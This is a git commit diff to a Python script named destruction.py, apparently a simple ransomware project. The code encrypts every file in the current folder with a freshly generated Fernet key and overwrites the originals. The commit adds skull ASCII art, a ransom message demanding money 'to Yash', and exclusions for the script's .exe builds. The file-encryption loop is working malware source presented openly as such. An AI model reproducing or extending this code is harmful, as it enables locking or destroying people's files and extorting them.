84f2013240e4e0a274b684ee0c1d4b6cbeb5b7b1
Yash Kolhatkar <138909671+yashkolhatkar09@users.noreply.github.com>
2024-04-25 21:54:49 +0530

    Add files via upload

--- destruction.py
+++ destruction.py
@@ -2,20 +2,52 @@ import os
 from cryptography.fernet import Fernet
 
 # first find all the files in the folder
-
-
 fileslist = []
 
+# ASCII art
+ascii_art = """
+                                                          ..
+                               ,,,                         MM .M
+                           ,!MMMMMMM!,                     MM MM  ,.
+   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
+ . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
+;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
+ M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
+ 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
+  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
+ MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
+ 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
+  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
+   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
+  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
+  MMM      :M  'MMMMMMMMMMMMM.MMMMM.MMMMMMMMMM'.MM  MM:M.    'MMMMM
+ .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
+AMMM..MMMMM:M.    :M.'MMMMMMMMMMMMMMMMMMMM'.MM'     MM''''''''''''
+MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
+ '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
+            MMM.            'MMMM!MMMM'            .MM
+             MMM.             '''   ''            .MM'
+              MMM.                               MMM'
+               MMMM            ,.J.JJJJ.       .MMM'
+                MMMM.       'JJJJJJJ'JJJM   CMMMMM
+                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
+                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
+                      'MMMMMMMMM'JJJJJ JJJJJ'
+                         ''MMMMMMJJJJJJJJJJ'
+                                 'JJJJJJ
+
+"""
+
 for files in os.listdir():
-    if (files == "destruction.py" or files == "construction.py" or files == "Key.key"):
+    if (files == "destruction.py" or files == "construction.py" or files == "Key.key" or files == "destruction.exe" or files == "construction.exe"):
         continue
     if (os.path.isfile(files)):
         fileslist.append(files)
 
 # print(fileslist)
 
-# Making a key to lock
 
+# Making a key to lock
 key = Fernet.generate_key()
 
 # Encrypt all the files in the folder
@@ -30,4 +62,8 @@ for files in fileslist:
     with open(files, "wb") as thefile:
         thefile.write(enc_contents)
 
+print(ascii_art)
 print("The Files Have Been Encrypted")
+print("To have your data back send $100000000000 to Yash.")
+# Prompt for user input to keep the console open
+input("Press Enter to exit...")
